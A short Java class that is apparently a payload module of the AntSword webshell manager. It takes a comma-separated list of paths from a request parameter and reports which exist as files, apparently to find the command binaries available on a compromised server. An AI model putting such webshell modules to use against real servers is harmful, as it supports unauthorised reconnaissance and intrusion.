package command;

import antSword.Template;

import java.io.File;

public class Listcmd extends Template {
    public String run() throws Exception {

        String z1 = getParam("antswordargbinarr");
        return ListcmdCode(z1);
    }

    String ListcmdCode(String binarrstr) {
        String[] binarr = binarrstr.split(",");
        String ret = "";
        for (int i = 0; i < binarr.length; i++) {
            File f = new File(binarr[i]);
            if (f.exists() && !f.isDirectory()) {
                ret += binarr[i] + "\t1\n";
            } else {
                ret += binarr[i] + "\t0\n";
            }
        }
        return ret;
    }

}
